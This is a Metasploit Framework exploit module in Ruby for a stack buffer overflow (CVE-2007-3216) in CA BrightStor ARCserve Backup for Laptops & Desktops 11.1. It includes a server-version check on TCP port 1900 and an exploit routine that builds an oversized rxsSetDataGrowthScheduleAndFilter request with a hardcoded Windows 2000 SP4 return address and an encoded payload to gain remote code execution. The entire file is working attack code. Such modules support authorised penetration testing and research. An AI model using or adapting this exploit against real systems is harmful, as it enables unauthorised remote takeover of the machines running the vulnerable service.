##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve for Laptops & Desktops LGServer (rxsSetDataGrowthScheduleAndFilter) Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
				for Laptops & Desktops 11.1. By sending a specially crafted request (rxsSetDataGrowthScheduleAndFilter),
				an attacker could overflow the buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10892 $',
			'References'     =>
				[
					[ 'CVE', '2007-3216' ],
					[ 'OSVDB', '35329' ],
					[ 'BID', '24348' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Windows 2000 SP4 English',	{ 'Ret' => 0x75031dce } ],
				],
			'DisclosureDate' => 'Jun 6 2007',
			'DefaultTarget' => 0))

		register_options([ Opt::RPORT(1900) ], self.class)
	end

	def check

		connect

		sock.put("0000000019rxrGetServerVersion")
		ver = sock.get_once

		disconnect

		if ( ver =~ /11.1.742/ )
				return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe

	end

	def exploit

		connect

		data = rand_text_alpha_upper(20080) + [target.ret].pack('V')
		data << payload.encoded + rand_text_alpha_upper(25000 - 20084 - payload.encoded.length)

		sploit  = "0000025000"				# Command Length Field
		sploit << "rxsSetDataGrowthScheduleAndFilter"	# RPC Command
		sploit << "~~"					# Constant Argument Delimiter
		sploit << data

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect

	end

end
